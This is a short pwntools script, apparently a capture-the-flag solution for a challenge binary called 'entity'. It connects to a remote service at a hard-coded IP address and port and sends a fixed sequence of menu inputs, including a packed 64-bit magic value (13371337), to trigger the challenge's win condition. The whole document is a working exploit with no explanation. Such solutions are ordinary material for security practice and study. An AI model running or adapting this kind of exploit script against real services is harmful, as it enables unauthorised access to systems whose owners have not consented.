from pwn import *

#p = process('./entity')
p = remote('161.35.162.249', 32742)

print(p.recv())
p.sendline(b'T')
print(p.recv())
p.sendline(b'S')
print(p.recv())
p.sendline(p64(13371337))
print(p.recv())
p.sendline(b'C')
print(p.recv())
